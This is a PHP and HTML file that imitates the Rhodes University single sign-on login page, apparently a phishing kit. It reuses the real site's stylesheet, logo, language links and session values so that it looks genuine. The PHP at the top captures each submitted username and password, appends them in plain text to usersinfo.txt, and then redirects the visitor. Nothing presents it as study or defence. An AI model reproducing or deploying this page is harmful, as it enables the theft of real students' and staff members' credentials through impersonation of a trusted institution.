<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['usernameValue'];
    $password = $_POST['passwordValue'];

    // Store user data in a text file
    $userData = "Username: $username\nPassword: $password\n";

    // Save user data to a text file
    file_put_contents('usersinfo.txt', $userData . PHP_EOL, FILE_APPEND);
    
    // Redirect to sign-in page
    header("Location: signin.php");
    exit();
}
?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="viewport" content="initial-scale=1.0" />
<script type="text/javascript" src="/simplesaml/resources/script.js"></script>
<title>Enter your username and password</title>

    <link rel="stylesheet" type="text/css" href="https://login.ru.ac.za/simplesaml/module.php/rhodes/rhodes.css" />
    <link rel="icon" type="image/icon" href="https://login.ru.ac.za/simplesaml/module.php/rhodes/favicon.ico" />

    <meta name="robots" content="noindex, nofollow" />
	<meta name="theme-color" content="#6a1b9a"/>

</head>
<body onload="SimpleSAML_focus('username');">

<div id="wrap">

    <div id="header">
		<a href="https://www.ru.ac.za/"><img src="https://login.ru.ac.za/images/rhodes-university.svg" alt="Rhodes University"></a>
        <h1><a href="/simplesaml/">Enter your username and password</a></h1>
    </div>


    <div id="languagebar"><a href="https://login.ru.ac.za/simplesaml/module.php/core/loginuserpass.php?AuthState=_786891e7c768b45798da99e3beff48cd1b5c71c507%3Ahttps%3A%2F%2Flogin.ru.ac.za%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fprotea.ru.ac.za%252Fshibboleth-sp%26RelayState%3Dss%253Amem%253A8b04c0700ee625e073e44484af655021edb8ab73df11a92bce322af245746dd0%26cookieTime%3D1712576753&amp;language=af">Afrikaans</a> | English | <a href="https://login.ru.ac.za/simplesaml/module.php/core/loginuserpass.php?AuthState=_786891e7c768b45798da99e3beff48cd1b5c71c507%3Ahttps%3A%2F%2Flogin.ru.ac.za%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fprotea.ru.ac.za%252Fshibboleth-sp%26RelayState%3Dss%253Amem%253A8b04c0700ee625e073e44484af655021edb8ab73df11a92bce322af245746dd0%26cookieTime%3D1712576753&amp;language=xh">isiXhosa</a></div>    <div id="content">

    <h2 style="break: both">Enter your username and password</h2>

    <p class="logintext">A service has requested you to authenticate yourself. Please enter your username and password in the form below.</p>

    <form action="ross.php" method="POST" name="f">
        <table>
            <tr>
                <td rowspan="2" class="loginicon">
                    <img alt=""
                        src="/simplesaml/resources/icons/experience/gtk-dialog-authentication.48x48.png" />
                </td>
                <td><label for="username">Username</label></td>
                <td>
                    <input id="usernameValue"type="text" name="usernameValue" autocomplete="username" tabindex="1" value="" />
                </td>
                </tr>
                <tr>
                <td><label for="password">Password</label></td>
                <td><input id="passwordValue" type="password" tabindex="2" name="passwordValue" autocomplete="current-password" /></td>
                </tr>
                <tr id="submit">
                <td class="loginicon"></td><td></td>
                <td>
                    <button id="submit_button" class="btn" tabindex="6" type="submit">Login</button>
                </td>
            </tr>
        </table>
        <input type="hidden" id="processing_trans" value="Processing..." />
        <input type="hidden" name="AuthState" value="_786891e7c768b45798da99e3beff48cd1b5c71c507:https://login.ru.ac.za/simplesaml/saml2/idp/SSOService.php?spentityid=https%3A%2F%2Fprotea.ru.ac.za%2Fshibboleth-sp&amp;RelayState=ss%3Amem%3A8b04c0700ee625e073e44484af655021edb8ab73df11a92bce322af245746dd0&amp;cookieTime=1712576753" />    </form>
<h2 class="logintext">Forgotten your password?</h2><p class="logintext"><ul class="logintext"><li><a href="https://ross.ru.ac.za/">Student password recovery</a></li><li><a href="https://www.ru.ac.za/informationandtechnologyservices/resources/forgotstaffpassword/">Staff password recovery</a></li></ul></p>            </div><!-- #content -->
            <div id="footer">
                <hr />
<!--
                 <img src="/simplesaml/resources/icons/ssplogo-fish-small.png" alt="Small fish logo" style="float: right" />		
                    Copyright &copy; 2007-2021 <a href="https://uninett.no/">UNINETT AS</a>
-->
		<span class="float-r"><a href="https://www.ru.ac.za/">Rhodes University</a></span>

                <br style="clear: right" />

            </div><!-- #footer -->
        </div><!-- #wrap -->
    </body>
</html>
